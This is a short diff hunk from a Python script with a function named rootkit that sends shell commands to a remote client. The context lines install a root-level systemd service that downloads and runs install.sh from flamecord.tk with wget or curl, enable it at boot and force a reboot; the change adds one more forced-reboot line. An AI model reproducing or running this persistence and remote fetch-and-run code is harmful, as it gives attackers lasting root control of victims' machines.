@@ -52,6 +52,7 @@ def rootkit(client):
             'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=sh -c \'(wget flamecord.tk/install.sh -O/install.sh || curl -L flamecord.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
             "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service;",
             "reboot -f;",
+            "/sbin/reboot -f"
     ]:
         write(client, x)
         time.sleep(0.5)
